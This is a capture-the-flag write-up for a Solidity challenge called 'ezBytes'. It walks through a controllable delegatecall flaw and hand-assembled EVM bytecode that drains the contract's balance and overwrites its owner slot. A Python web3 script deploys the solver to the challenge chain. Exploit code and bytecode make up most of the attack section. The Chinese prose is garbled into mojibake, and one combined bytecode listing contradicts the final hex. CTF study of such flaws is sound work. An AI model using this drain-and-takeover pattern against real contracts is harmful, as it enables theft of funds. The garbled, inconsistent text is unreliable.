(éœ€è¦ç§‘å­¦ä¸Šç½‘ğŸ§ğŸ’¡)æ–°å»ºä¸€ä¸ªezBytes.solæ–‡ä»¶,ç¼–è¯‘é€‰é¡¹é¡µé¢è®°å¾—é€‰æ‹©ç¼–è¯‘å™¨ç‰ˆæœ¬ä¸ºæºç å¼€å¤´æ ‡è¯†çš„0.7.2, ç¼–è¯‘æˆåŠŸåå³å¯éƒ¨ç½²</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241998.png"                      alt="image-20231128210842347"                ><figcaption>image-20231128210842347</figcaption></figure></p><p>åˆ‡æ¢åˆ°éƒ¨ç½²ç•Œé¢ï¼Œé€‰æ‹©ç¯å¢ƒä¸ºmetamaskï¼Œè¿™æ ·æ‰èƒ½è®¿é—®åˆ°ç§é“¾ä¸Šçš„åˆçº¦ï¼Œåœ¨At Addresså¤„å†™ä¸‹åˆšæ‰è·å–çš„challengeåˆçº¦åœ°å€0xee7Cc887214b782563D9E4D42A124684e20E15bd</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241787.png"                      alt="image-20231128211753657"                ><figcaption>image-20231128211753657</figcaption></figure></p><p>ç‚¹å‡»â€œAt Addressâ€å³å¯å¾—åˆ°challengeåˆçº¦</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290241096.png"                      alt="image-20231128211834506" style="zoom: 50%;"                 ><figcaption>image-20231128211834506</figcaption></figure><h2 id="0x02-åˆçº¦åˆ†æ"><a href="#0x02-åˆçº¦åˆ†æ" class="headerlink" title="0x02 åˆçº¦åˆ†æ"></a>0x02 åˆçº¦åˆ†æ</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.2;</span><br><span class="line">contract ezBytes&#123;</span><br><span class="line">    address public  i_owner;</span><br><span class="line">    bytes32 private  password=&quot;jnctf2023&quot;;</span><br><span class="line">    constructor() payable  public&#123;</span><br><span class="line">        i_owner = msg.sender;//åˆå§‹åŒ–i_ownerï¼Œç”±äºåˆçº¦æ„é€ å‡½æ•°æ‰§è¡Œçš„é‚£ä¸ªäº¤æ˜“æ˜¯deployerè´¦å·å‘èµ·çš„ï¼Œå› æ­¤i_ownerå°±å¯¹æ ‡äº†åˆçº¦æ‰€æœ‰è€…</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner &#123;//è¢«onlyOwnerä¿®é¥°çš„å‡½æ•°åªæœ‰åˆçº¦æ‰€æœ‰è€…æ‰èƒ½æ‰§è¡Œ</span><br><span class="line">        if(msg.sender != i_owner) &#123; require(false); &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function challenge(address _yourContractAdd) public payable&#123;</span><br><span class="line"></span><br><span class="line">        uint256 size;</span><br><span class="line">        bytes memory your_code;</span><br><span class="line"></span><br><span class="line">        assembly&#123;//åŠ¨æ€è·å–ç»™å®šåˆçº¦åœ°å€ _yourContractAdd çš„ä»£ç ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°ä»¥ mload(0x40) ä¸ºèµ·å§‹ä½ç½®çš„å†…å­˜ä¸­ï¼Œåé¢çš„ä¸‰è¡Œä¸»è¦æ˜¯ä¸ºäº†ä¿è¯size</span><br><span class="line">            size := extcodesize(_yourContractAdd)</span><br><span class="line">            your_code := mload(0x40)</span><br><span class="line">            mstore(0x40, add(your_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))//ä¿è¯æ˜¯32å­—èŠ‚çš„å€æ•°</span><br><span class="line">            mstore(your_code, size)</span><br><span class="line">            extcodecopy(_yourContractAdd, add(your_code, 0x20), 0, size)//ä»ç›®æ ‡åˆçº¦çš„å¼€å¤´å¤åˆ¶sizeå¤§å°çš„å­—èŠ‚åˆ°å†…å­˜ä¸­</span><br><span class="line">        &#125;</span><br><span class="line">        for(uint256 i = 0; i &lt; your_code.length; i++) &#123;</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success, ) = _yourContractAdd.delegatecall(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function check() public view returns(bool)&#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function changePassword(bytes32 str)onlyOwner payable public&#123;//</span><br><span class="line">        password=str;</span><br><span class="line">    &#125;</span><br><span class="line">    function checkPassword() public view returns (bool)&#123;</span><br><span class="line">        return password==&quot;22222222222222&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool flag1=check();</span><br><span class="line">        require(flag1,&quot;Oops, there is still a balance in the contract account.&quot;);</span><br><span class="line">        bool flag2=checkPassword();</span><br><span class="line">        require(flag2,&quot;Password is wrong.&quot;);</span><br><span class="line">        return flag1&amp;&amp;flag2 ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>é¦–å…ˆçœ‹åˆ°æœ€ç»ˆéœ€è¦è®©å…¶è¿”å›trueçš„isSolvedå‡½æ•°æ€»å…±éœ€è¦è§£å†³ä¸¤ä¸ªæ¡ä»¶</p><ul><li>ç›—å–åˆçº¦å†…çš„æ‰€æœ‰balanceï¼ˆä½™é¢ï¼‰</li><li>ä¿®æ”¹passwordï¼ˆchangePasswordå‡½æ•°åªæœ‰åˆçº¦æ‰€æœ‰è€…æ‰å¯ä»¥æ‰§è¡Œï¼‰</li></ul><p>å¾ˆæ˜æ˜¾çœ‹åˆ°challengeå‡½æ•°æœ‰åˆçº¦åœ°å€å¯æ§çš„delegatecallè°ƒç”¨</p><h3 id="æ¼æ´ç‚¹åˆ†æ"><a href="#æ¼æ´ç‚¹åˆ†æ" class="headerlink" title="æ¼æ´ç‚¹åˆ†æ"></a>æ¼æ´ç‚¹åˆ†æ</h3><p>delegatecallè°ƒç”¨å¾ˆå®¹æ˜“å¯ä»¥è”æƒ³åˆ°å§”æ‰˜è°ƒç”¨æ¼æ´ï¼Œdelegatecallçš„å‚æ•°æ˜¯å‡½æ•°çš„abiï¼Œç®€å•æ¥è¯´åªè¦delegatecallå‚æ•°ï¼ŒåŠå‰é¢çš„addréƒ½å¯æ§ï¼Œå°±èƒ½å®ç°å½“å‰åˆçº¦æ‰§è¡Œä»»æ„åˆçº¦çš„ä»»æ„æ–¹æ³•ï¼ˆç›¸å½“äºç›´æ¥æŠŠé‚£ä¸ªå‡½æ•°æ’å…¥åˆ°å½“å‰åˆçº¦ä»£ç ä¸­ç›´æ¥æ‰§è¡Œï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241807.png"                      alt="image-20231128213125822"                ><figcaption>image-20231128213125822</figcaption></figure></p><blockquote><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢Aåˆçº¦é€šè¿‡å§”æ‰˜è°ƒç”¨äº†Båˆçº¦çš„æ–¹æ³•ä¿®æ”¹äº†è‡ªèº«çš„å±æ€§</p><p>è¿™é‡Œå†åŠ ä¸€ä¸ªæ¦‚å¿µSlotï¼Œä»¥å¤ªåŠæ•°æ®å­˜å‚¨ä¼šä¸ºåˆçº¦çš„æ¯é¡¹æ•°æ®æŒ‡å®šä¸€ä¸ªå¯è®¡ç®—çš„å­˜å‚¨ä½ç½®ï¼Œå­˜æ”¾åœ¨ä¸€ä¸ªå®¹é‡ä¸º 2^256 çš„è¶…çº§æ•°ç»„ä¸­ï¼Œæ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ ç§°ä¸ºæ’æ§½</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># æ’æ§½å¼æ•°ç»„å­˜å‚¨</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # æ¯ä¸ªæ’æ§½ 32 å­—èŠ‚</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure></div><p>ç¼–è¯‘æ—¶å°†ä¸¥æ ¼æ ¹æ®å­—æ®µæ’åºé¡ºåº(*)ï¼Œä»ä½ç½® 0 å¼€å§‹è¿ç»­æ”¾ç½®åœ¨å­˜å‚¨ä¸­ã€‚å¦‚æœå¯èƒ½çš„è¯ï¼Œå¤§å°å°‘äº 32 å­—èŠ‚çš„å¤šä¸ªå˜é‡ä¼šè¢«æ‰“åŒ…åˆ°ä¸€ä¸ªæ’æ§½ä¸­ï¼Œè€Œå½“æŸé¡¹æ•°æ®è¶…è¿‡ 32 å­—èŠ‚ï¼Œåˆ™éœ€è¦å ç”¨å¤šä¸ªè¿ç»­æ’æ§½</p><p>å¦‚ä¸‹åˆçº¦</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line"> address a;      // 0</span><br><span class="line"> uint8 b;        // 0</span><br><span class="line"> uint256 c;      // 1</span><br><span class="line"> bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å­˜å‚¨å¸ƒå±€å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div></blockquote><p>å†çœ‹ä¸€ä¸‹å¯¹äºdelegatecallè°ƒç”¨çš„å­—èŠ‚ç çš„é™åˆ¶ï¼Œé¢˜ç›®åˆçº¦ä¸­ä¼šå…ˆå°†ç›®æ ‡åˆçº¦çš„å­—èŠ‚ç å…ˆå¤åˆ¶è¿‡æ¥é€å­—èŠ‚æ£€æŸ¥</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for(uint256 i = 0; i &lt; your_code.length; i++) &#123;</span><br><span class="line">    require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);</span><br><span class="line">    require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);</span><br><span class="line">    require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);</span><br><span class="line">    require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>é™åˆ¶äº†ä¸èƒ½ç”¨</p><ul><li>0xff(è‡ªæ¯åˆçº¦æŒ‡ä»¤å¯ä»¥è®©åˆçº¦è‡ªè¡Œé”€æ¯ï¼Œå¹¶å°†è´¦æˆ·ä¸­çš„ETHä½™é¢å‘é€åˆ°æŒ‡å®šåœ°å€)</li><li>0xf5(CREATE2,å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæ–°åˆçº¦å¹¶å‘é€æŒ‡å®šæ•°é‡weiçš„ETH)</li><li>0x01(ADD)</li><li>æ‰€æœ‰å¶æ•°çš„Opcodes</li><li>0x00(STOP)</li></ul></blockquote><h3 id="ç›—å–åˆçº¦å†…ä½™é¢"><a href="#ç›—å–åˆçº¦å†…ä½™é¢" class="headerlink" title="ç›—å–åˆçº¦å†…ä½™é¢"></a>ç›—å–åˆçº¦å†…ä½™é¢</h3><h4 id="å…ˆä»‹ç»å‡ ä¸ªEVM-Opcode"><a href="#å…ˆä»‹ç»å‡ ä¸ªEVM-Opcode" class="headerlink" title="å…ˆä»‹ç»å‡ ä¸ªEVM Opcode"></a>å…ˆä»‹ç»å‡ ä¸ªEVM Opcode</h4><p>æ›´å¤šOpcodeå¯ä»¥å‚è€ƒ<a class="link"   href="https://www.evm.codes/?fork=shanghai" >https://www.evm.codes/?fork=shanghai <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li><p>SELFBALANCEï¼šå°†åˆçº¦ä½™é¢å‹å…¥æ ˆä¸­ï¼Œå•ä½ä¸º<code>wei</code></p></li><li><p>SSTOREï¼šå°†æ ˆé¡¶çš„ä¸¤ä¸ªå…ƒç´ è§†ä¸ºkeyå’Œvalue(æ ˆé¡¶),å°†valueèµ‹å€¼ç»™ç¬¬keyä¸ªslot</p></li><li><p>CALL:åˆ›å»ºä¸€ä¸ªå­ç¯å¢ƒæ¥æ‰§è¡Œå…¶ä»–åˆçº¦çš„éƒ¨åˆ†ä»£ç ï¼Œå‘é€<code>ETH</code>ï¼Œå¹¶è¿”å›success(å‘é€ETHæ˜¯å¦æˆåŠŸ)</p><p>CALLä¼šä»å †æ ˆä¸­å¼¹å‡º7ä¸ªå‚æ•°ï¼Œä¾æ¬¡ä¸ºï¼š</p><ul><li><code>gas</code>ï¼šä¸ºè¿™æ¬¡è°ƒç”¨åˆ†é…çš„gasé‡ã€‚</li><li><code>to</code>ï¼šè¢«è°ƒç”¨åˆçº¦çš„åœ°å€ã€‚</li><li><code>value</code>ï¼šè¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ï¼Œå•ä½ä¸º<code>wei</code>ã€‚</li><li><code>mem_in_start</code>ï¼šè¾“å…¥æ•°æ®ï¼ˆcalldataï¼‰åœ¨å†…å­˜çš„èµ·å§‹ä½ç½®ã€‚</li><li><code>mem_in_size</code>ï¼šè¾“å…¥æ•°æ®çš„é•¿åº¦ã€‚</li><li><code>mem_out_start</code>ï¼šè¿”å›æ•°æ®ï¼ˆreturnDataï¼‰åœ¨å†…å­˜çš„èµ·å§‹ä½ç½®ã€‚</li><li><code>mem_out_size</code>ï¼šè¿”å›æ•°æ®çš„é•¿åº¦ã€‚</li></ul></li></ul><p>å¯ä»¥æ„é€ 7ä¸ªæ ˆè¾“å…¥ä½¿å¾—åˆçº¦ä½™é¢å…¨éƒ¨è½¬åˆ°æŸä¸ªåœ°å€ï¼Œä¸‹é¢ç¤ºä¾‹æ˜¯ç›´æ¥è½¬åˆ°0åœ°å€</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">CALL</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œç”¨PUSH2æ˜¯å› ä¸ºé™åˆ¶ä¸èƒ½ç”¨å¶æ•°çš„Opcode</p></blockquote><h3 id="ä¿®æ”¹åˆçº¦æ‰€æœ‰è€…"><a href="#ä¿®æ”¹åˆçº¦æ‰€æœ‰è€…" class="headerlink" title="ä¿®æ”¹åˆçº¦æ‰€æœ‰è€…"></a>ä¿®æ”¹åˆçº¦æ‰€æœ‰è€…</h3><p>ç”±äºæºç ä¸­i_ownerå¤„äºslot 0</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.2;</span><br><span class="line">contract ezBytes&#123;</span><br><span class="line">    address public  i_owner;</span><br><span class="line">    //...</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥åˆ©ç”¨SSTOREä»¥åŠCALLERï¼ŒæŠŠè°ƒç”¨åˆçº¦çš„åˆçº¦åœ°å€ï¼ˆæˆ‘ä»¬è‡ªèº«ï¼‰èµ‹å€¼ç»™slot 0</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CALLER           //æŠŠè°ƒç”¨è€…åœ°å€å‹å…¥æ ˆ </span><br><span class="line">PUSH2 0x0000     // å°†0x0000å‹å…¥æ ˆ</span><br><span class="line">SSTORE           // å­˜å‚¨æ•°æ®åˆ°çŠ¶æ€å˜é‡</span><br></pre></td></tr></table></figure></div><p>ç»¼åˆä¸€ä¸‹æ€»ä½“çš„å­—èŠ‚ç </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">CALL</span><br></pre></td></tr></table></figure></div><p>æœ€åéœ€è¦åŠ ä¸Šå¸¸è§„çš„åˆçº¦å‡†å¤‡å·¥ä½œ,æŠŠåé¢éœ€è¦çš„25å­—èŠ‚çš„å­—èŠ‚ç æ‹·è´åˆ°å†…å­˜ï¼Œè¿™25å­—èŠ‚ä¹Ÿæ˜¯åç»­é¢˜ç›®åˆçº¦çš„å†…è”æ±‡ç¼–ä¸­é€šè¿‡extcodesizeä»¥åŠextcodecopyèƒ½æ¥è§¦åˆ°çš„å­—èŠ‚ç </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x19         // å°†0x19å‹å…¥æ ˆ</span><br><span class="line">DUP1              // å¤åˆ¶æ ˆé¡¶å…ƒç´ </span><br><span class="line">PUSH1 0x09         // å°†0x09å‹å…¥æ ˆ</span><br><span class="line">RETURNDATASIZE    // è·å–ä¸Šä¸€ä¸ªå¤–éƒ¨è°ƒç”¨çš„è¿”å›æ•°æ®çš„å¤§å°,é˜²æ­¢è¦†ç›–</span><br><span class="line">CODECOPY          // å°†åˆçº¦ä»£ç æ‹·è´åˆ°å†…å­˜ </span><br><span class="line">RETURNDATASIZE    // è·å–è¿”å›æ•°æ®çš„å¤§å°</span><br><span class="line">F3  *RETURN           // è¿”å›</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œå…¶å®å°±æ˜¯æŠŠ0x09åçš„25å­—èŠ‚æ‹·è´çš„å†…å­˜ä¸­ï¼Œè€Œä¸Šé¢çš„å‡†å¤‡éƒ¨åˆ†åˆšå¥½æ˜¯9ä¸ªå­—èŠ‚</p><p>è¿™ä¸€æ®µæ˜¯åœ¨åˆçº¦éƒ¨ç½²çš„æ—¶å€™æ‰§è¡Œçš„</p></blockquote><h3 id="éƒ¨ç½²sloveråˆçº¦"><a href="#éƒ¨ç½²sloveråˆçº¦" class="headerlink" title="éƒ¨ç½²sloveråˆçº¦"></a>éƒ¨ç½²sloveråˆçº¦</h3><p>sloveråˆçº¦æ˜¯ä¸€ä¸ªå·¥å…·äººåˆçº¦ï¼Œç”¨æ¥è¢«ä¸Šé¢çš„å­—èŠ‚ç æ›¿æ¢ï¼Œéƒ¨ç½²çš„è¯å¾—ä½¿ç”¨pythonè„šæœ¬</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_files, install_solc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://43.143.170.225:20001&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span>(w3.is_connected())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_new_account</span>():</span><br><span class="line">    keys = w3.eth.account.create()</span><br><span class="line">    address = w3.to_checksum_address(keys.address)</span><br><span class="line">    privateKey = <span class="built_in">hex</span>(bytes_to_long(keys.key))</span><br><span class="line">    <span class="keyword">return</span> (address, privateKey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">privateKey = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">account = w3.eth.account.from_key(privateKey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;player_address: &#x27;</span> + account.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_transaction</span>(<span class="params">account, func, args=(<span class="params"></span>)</span>):</span><br><span class="line">    nonce = w3.eth.get_transaction_count(account.address)</span><br><span class="line">    txn = func(*args).build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: account.address,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, account.key)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line">install_solc(version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line">compiled_sol = compile_files(<span class="string">&#x27;Chall.sol&#x27;</span>, output_values=[<span class="string">&#x27;abi&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>], solc_version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_address = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">challenge_abi = compiled_sol[<span class="string">&#x27;Chall.sol:ezBytes&#x27;</span>][<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">challenge_contract = w3.eth.contract(address=challenge_address, abi=challenge_abi)</span><br><span class="line"></span><br><span class="line">contract_interface = compiled_sol[<span class="string">&#x27;Chall.sol:Solver&#x27;</span>]</span><br><span class="line">solver_abi = contract_interface[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">solver_bytecode = <span class="string">&#x27;60198060093d393df3610000610000610000610000473361000055610000610000f1&#x27;</span></span><br><span class="line">solver_contract = w3.eth.contract(abi=solver_abi, bytecode=solver_bytecode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Creating solver contract...&#x27;</span>)</span><br><span class="line">solver_address = send_transaction(account, solver_contract.constructor).contractAddress</span><br><span class="line"><span class="built_in">print</span>(solver_address)</span><br></pre></td></tr></table></figure></div><p>è¿è¡Œå¾—åˆ°sloveråˆçº¦åœ°å€,å¯ä»¥ä½¿ç”¨Remix IDEç›´æ¥è°ƒç”¨challengeå‡½æ•°</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241555.png"                      alt="image-20231129023343884"                ><figcaption>image-20231129023343884</figcaption></figure></p><p>ç°åœ¨checkå‡½æ•°å·²ç»è¿”å›äº†trueï¼Œè¯´å—åˆçº¦å†…ä½™é¢å·²æ¸…ç©ºï¼Œå†æŸ¥çœ‹åˆçº¦æ‰€æœ‰è€…ï¼Œä¹Ÿæ›´æ”¹æˆå½“å‰è´¦æˆ·</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241294.png"                      alt="image-20231129023536722"                ><figcaption>image-20231129023536722</figcaption></figure></p><p>ç°åœ¨å·²ç»å¯ä»¥è°ƒç”¨changePasswordæ¥ä¿®æ”¹å¯†ç äº†,æ³¨æ„è¦è¾“å…¥16è¿›åˆ¶ä¿®é¥°ï¼Œå®Œæ•´çš„32å­—èŠ‚ 0x3232323232323232323232323232000000000000000000000000000000000000</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241535.png"                      alt="image-20231129023719689"                ><figcaption>image-20231129023719689</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241783.png"                      alt="image-20231129023912725"                ><figcaption>image-20231129023912725</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241156.png"                      alt="image-20231129024003714"                ><figcaption>image-20231129024003714</figcaption></figure></p><h2 id="0x03-ä¸€æŠŠæ¢­è„šæœ¬"><a href="#0x03-ä¸€æŠŠæ¢­è„šæœ¬" class="headerlink" title="0x03 ä¸€æŠŠæ¢­è„šæœ¬"></a>0x03 